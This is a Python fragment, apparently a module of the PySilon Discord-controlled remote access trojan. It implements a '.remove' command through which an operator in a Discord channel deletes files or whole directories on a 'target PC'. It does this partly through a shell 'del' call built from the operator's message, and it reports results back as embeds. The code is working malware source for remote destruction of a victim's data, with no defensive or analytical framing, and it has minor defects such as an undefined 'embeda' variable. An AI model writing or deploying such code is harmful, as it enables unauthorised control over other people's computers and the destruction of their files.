import os
from shutil import copy2, rmtree
from resources.misc import *
import subprocess
# end of imports

# on message
elif message.content[:7] == '.remove':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        if message.content.strip() == '.remove':
            embed = discord.Embed(title="📛 Error",description=f'```Syntax: .remove <file-or-directory>```', colour=0x8B0000)
            embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
            
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        else:
            if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                try:
                    if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
                        subprocess.run('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"', shell=True)
                    else:
                        rmtree('/'.join(working_directory) + '/' + message.content[8:])
                    embed = discord.Embed(title="🟢 Sucsess",description=f'```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```', colour=0x013220)
                    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                    
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                except Exception as error:
                    embed = discord.Embed(title="📛 Error",description=f'`' + str(error) + '`', colour=0x8B0000)
                    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                    
                    reaction_msg = await message.channel.send(embed=embeda); await reaction_msg.add_reaction('🔴')
            else:
                embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=0x8B0000)
                embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                
                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        embed = discord.Embed(title="📛 Error",description=f'||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=0x8B0000)
        embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
        
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
